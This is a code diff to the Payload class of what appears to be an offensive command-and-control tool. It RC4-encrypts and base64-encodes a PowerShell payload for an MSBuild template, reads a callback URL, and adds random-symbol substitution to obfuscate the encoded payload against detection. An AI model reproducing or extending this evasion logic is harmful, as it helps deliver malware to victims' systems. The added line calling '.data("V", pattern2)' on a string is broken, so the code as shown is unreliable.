@@ -7,6 +7,7 @@
 
 import os
 import base64
+import random
 from core.utils import Utils
 from core.rc4 import RC4
 
@@ -90,7 +91,13 @@ class Payload:
         hex_rc4_key = RC4.format_rc4_key(rc4_key)
         rc4 = RC4(rc4_key)
         data = base64.b64encode(rc4.crypt(ps))
-        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key)
+        pattern1 = self.gen_pattern("#!@$%?&/-~")
+        pattern2 = self.gen_pattern(",.<>)(*[]{}+`")    
+        data = data.replace("m", pattern1).data("V", pattern2)
+        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key).replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
 
     def get_url(self):
         return self.config.get("callback-url")
+    
+    def gen_pattern(self, charset):    
+        return ''.join(random.sample(charset,len(charset)))
